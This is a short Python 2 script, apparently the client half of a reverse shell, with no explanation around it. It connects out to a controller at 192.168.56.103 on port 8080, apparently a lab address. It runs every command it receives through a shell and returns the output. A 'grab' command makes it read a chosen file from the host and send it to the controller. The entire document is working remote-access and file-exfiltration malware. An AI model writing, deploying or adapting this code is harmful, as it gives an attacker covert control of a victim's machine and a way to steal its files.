import socket
import subprocess
import os
def transfer(s,path):

	if os.path.exists(path):
		f = open(path, 'rb')
		packet = f.read(1024)
		while packet != '':
			s.send(packet)
			packet = f.read(1024)

		s.send('DONE')
		f.close()

def connect():
	try: 
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(("192.168.56.103", 8080))

		while True: #keep receiving commands from the server
			command = s.recv(1024)
			if 'terminate' in command:
				s.close()
				break

			elif 'grab' in command:
				grab, path = command.split('*')
				try:
					transfer(s,path)

				except Exception, e:
					s.send(str(e))
					pass
			else:
				CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				s.send( CMD.stdout.read() )
				s.send( CMD.stderr.read() )
	except KeyboardInterrupt:
		exit(0)


if __name__ == '__main__':
	connect()